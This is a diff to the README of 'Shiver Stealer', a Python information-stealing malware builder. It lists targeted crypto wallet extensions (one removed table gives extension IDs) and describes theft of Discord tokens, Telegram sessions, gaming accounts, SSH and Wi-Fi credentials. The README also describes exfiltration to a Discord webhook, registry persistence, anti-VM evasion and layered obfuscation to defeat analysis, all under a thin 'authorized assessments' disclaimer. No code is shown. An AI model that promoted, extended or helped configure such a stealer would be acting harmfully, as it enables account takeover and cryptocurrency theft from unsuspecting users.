@@ -55,73 +55,12 @@ Discord, Discord Canary, Discord PTB, Discord Development, Lightcord, Vesktop, V
 
 ### Cryptocurrency Wallet Theft
 
-**Supported Wallets (60+ Extensions)**
+**Web3 Wallet Extensions (60+)**
 
-| Wallet | Extension ID |
-|--------|--------------|
-| MetaMask | `nkbihfbeogaeaoehlefnkodbefgpgknn` |
-| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
-| Rabby | `acmacodkjbdgmoleebolmdjonilkdbch` |
-| Coinbase Wallet | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
-| Binance Wallet | `fhbohimaelbohpjbbldcngcnapndodjp` |
-| Keplr | `dmkamcknogkgcdfhhbddcghachkejeap` |
-| Nami | `lpfcbjknijpeeillifnkikgncikgfhdo` |
-| Ronin Wallet | `bblcdmnaokkbpjhbfaoplfihdppbgb` |
-| Trust Wallet | `egjidjbpglichdcondbcbdnbeeppkphb` |
-| Math Wallet | `afbcbjpbpfadlkmhmclhkeeodmamcflc` |
-| Terra Station | `aiifbnbfobpmeekipheeijimdpnlpgpp` |
-| Martian Wallet | `cpcjdphnpdjjajagadejpbjnfdkfbhpb` |
-| Petra | `ejjladineckdgjemeijbdahhhbhehdoe` |
-| Fewcha | `jdkknndbebbapbiloaofgmceiiphokap` |
-| Pontem | `phkbamefinggmakgklpkljjmgibohnba` |
-| Solflare | `bhhhlbepdkbapadjdnnojkbgioiodbic` |
-| Exodus | `aholpfdialjgjfhomihkjbmgjidlcdno` |
-| Tally | `eipmnfdnkjofgnpjjdgmfnaoibgklnjc` |
-| Frame | `ejbalbakoplchlghecdalmeeeajnimhm` |
-| Liquality | `kpfopkelmcoipemdgiijsikoboeppfom` |
-| XDEFI | `hmeobnfnfcmdkdcmlblgagmfpfboieaf` |
-| Core | `agoakfejjabomempkjlepdflaleeobhb` |
-| SubWallet | `onhogfjeacnfoofkfgppdlbmlmnplgbn` |
-| Talisman | `fijngjgcjhjmmpcmkeiomlglpeiijkld` |
-| Polkadot.js | `fhmfendgdocmcbmfikdcogofphimnkno` |
-| Yoroi | `ffnbelfdoeiohenkjibnmadjiehjhajb` |
-| Eternl | `kmhcihpebfmpgmihbkipmjlmmioameka` |
-| Flint | `hnhobjmcibchnmglfbldbfabcgaknlkj` |
-| GeroWallet | `bikervjbuzqmfgdlhifppjbfflbnkoki` |
-| Begin Wallet | `jinjaccalgkegednnccohejagnlnfdag` |
-| BYONE | `fhilaheimglignddkjgofkcbgekhenbh` |
-| SafePal | `lgmpcpglpngdoalbgeoldeajfclnhafa` |
-| OneKey | `jnmbobjmhlngoefaiojfljckilhhlhcj` |
-| imToken | `nlbmnnijcnlegkjjpcfjclmcfggfefdm` |
-| TP Wallet | `mfgccjchihfkkindfppnaooecgfneiii` |
-| BitKeep | `jiidiaalihmmhddjgbnbgdfflelocpak` |
-| OKX Wallet | `mcohilncbfahbmgdjkbpemcciiolgcge` |
-| Kraken | `ifbboakaemklalnlmnpdkeiifbfijjlm` |
-| Enkrypt | `gkjbkjkpjpdpbhkdpjlnjlnjlnjlnjln` |
-| MyCrypto | `nlgbhdfgdhgbiamfdfmbikcdghjaddom` |
-| Harmony | `fnnegphlobjdpkhecapkijjdkgcjhkib` |
-| ICONex | `flpiciilemghbmfalicajoolhkkenfel` |
-| Wombat | `amkmjjmmflddogmhpjloimipbofnfjih` |
-| Guild Wallet | `nanjmdknhkinifnkgdcggcfnhdaammmj` |
-| Neoline | `cphhlgmgameodnhkjdmkpanlelnlohao` |
-| Cyano | `dkdedlpgdmmkkfjabffeganieamfklkm` |
-| OntoWallet | `oplligpicccjckpbcjkfdpogfcbgpmkl` |
-| Concordium | `abjcfabbhafbcdfjoecdgepllmpfceif` |
-| Alephium | `oaogpojkjpmjnkebcnldlkmjcpmiodcg` |
-| Sui Wallet | `opcgpfmipidbgpenhmajajpdcbmgilic` |
-| Manta | `hpglgdghhkapgdjpbmkbkpnkjkbgbfde` |
-| Nightly | `fidojkfdpbkfaijipobknkdlifdcfemp` |
-| Backpack | `aflkmfhebedbjioipglgcbcmnbpgliof` |
-| Grindery | `jdogphakondfdmcanicanmbfaangegaf` |
-| Starcoin | `mfhbebgoclkghebffdldpobeajmbecfk` |
-| Kukai | `ookjlbkiijinhpmnjffcofjonbfbgaoc` |
-| Temple | `ookjlbkiijinhpmnjffcofjonbfbgaoc` |
-| Spire | `hbcennhacfaagdopikcegfcobcadeocj` |
-| Nufinetes | `kiopjekfhmcphcqnfahhncbfbggaagdj` |
-| Alby | `kmeopaelnckbmkpgdnlkcajoaifmhkpd` |
+All major browser extension wallets extracted via Local Extension Settings: MetaMask, Phantom, Rabby, Coinbase Wallet, Binance Wallet, Keplr, Nami, Ronin, Trust Wallet, Solflare, Exodus, Tally, Frame, XDEFI, Core, SubWallet, Talisman, Polkadot.js, Yoroi, Eternl, Flint, GeroWallet, SafePal, OneKey, imToken, TP Wallet, BitKeep, OKX Wallet, Kraken, Enkrypt, MyCrypto, Harmony, ICONex, Wombat, Guild Wallet, Neoline, Cyano, OntoWallet, Concordium, Alephium, Sui Wallet, Manta, Nightly, Backpack, Grindery, Starcoin, Kukai, Temple, Spire, Nufinetes, Alby, and more.
 
 **Desktop Wallets:**
-- Exodus, Atomic, Electrum, Coinomi, Wasabi Wallet
+- Exodus, Atomic, Electrum, Coinomi, Wasabi Wallet, Ledger Live
 
 ### Gaming Account Theft
 
@@ -141,15 +80,8 @@ Discord, Discord Canary, Discord PTB, Discord Development, Lightcord, Vesktop, V
 - Account verification via mobile API
 - Robux balance and premium status
 
-### Social Media Integration
+### Telegram Session Stealing
 
-**Instagram**
-- Session ID extraction from browser cookies
-- Account information via Instagram API
-- Follower/following counts
-- Profile metadata
-
-**Telegram**
 - Session data from `tdata` directory
 - Account authentication files
 - Complete session archive
@@ -236,10 +168,11 @@ Discord, Discord Canary, Discord PTB, Discord Development, Lightcord, Vesktop, V
 - Optional enable/disable via builder
 
 **Code Obfuscation**
-- Marshal serialization
-- Zlib compression
-- Base64 encoding
-- No external obfuscation dependencies
+- Multi-layer runtime code reconstruction
+- Dynamic payload assembly with integrity verification
+- Anti-tampering chain verification
+- String literal transformation
+- Control flow obfuscation
 
 **Discord Webhook Integration**
 - Structured embed messages with color coding
@@ -255,7 +188,7 @@ The interactive builder menu provides the following configuration options:
 | Option | Description |
 |--------|-------------|
 | **Webhook URL** | Discord webhook endpoint for data exfiltration (required) |
-| **Obfuscation** | Enable marshal+zlib+base64 code obfuscation |
+| **Obfuscation** | Enable multi-layer code obfuscation |
 | **Startup** | Enable persistence via registry and startup folder |
 | **Anti-VM** | Enable virtual machine detection and evasion |
 | **Fake Error** | Configure custom error dialog display |
@@ -319,7 +252,7 @@ pip install -r requirements.txt
 ### Quick Start
 
 ```bash
-python shiver.bat
+shiver.bat
 ```
 
 Select option **[1]** to launch the builder menu.
@@ -352,7 +285,7 @@ The stealer generates the following files for exfiltration:
 | `shiver_wifi_passwords.txt` | Wi-Fi network credentials |
 | `shiver_interesting_files.txt` | Sensitive file discoveries |
 | `shiver_history.txt` | Browsing history by browser |
-| `shiver_extra_data.txt` | Gaming, social, and miscellaneous data |
+| `shiver_extra_data.txt` | Gaming, Telegram, SSH, and miscellaneous data |
 | `*.zip` | Web3 wallet extensions, Steam sessions, Telegram data |
 
 ## Webhook Output Example
@@ -377,7 +310,7 @@ This tool is designed for authorized security assessments and educational purpos
 
 - No harmful payloads or destructive code
 - Information gathering only
-- Obfuscation to prevent static analysis
+- Multi-layer obfuscation to prevent static analysis
 - Anti-VM detection to avoid sandbox analysis
 - Process restoration to minimize user suspicion
 
@@ -404,12 +337,11 @@ shiver-stealer/
     ├── discord.py         # Discord token acquisition (19 clients)
     ├── gaming.py          # Gaming account theft (Steam, Minecraft, Roblox)
     ├── kiwi.py            # File system search (116 keywords)
-    ├── social.py          # Social media integration (Instagram)
     ├── ssh.py             # SSH connection theft (20+ clients)
     ├── stealer.py         # Main orchestrator
     ├── system.py          # System information gathering
     ├── utils.py           # Shared utilities and cryptography
-    ├── wallets.py         # Desktop wallet theft
+    ├── wallets.py         # Desktop wallet theft (Exodus, Atomic, Electrum, Coinomi, Wasabi, Ledger Live)
     ├── web3.py            # Web3 wallet extensions (60+ wallets)
     └── webhook.py         # Discord webhook formatting
 ```
@@ -436,6 +368,6 @@ For issues, questions, or contributions, please open an issue on GitHub.
 
 **Shiver Stealer** - Advanced Information Gathering Utility
 
-*Built with Python | Compiled with PyInstaller | Obfuscated with marshal+zlib+base64*
+*Built with Python | Compiled with PyInstaller*
 
 </div>
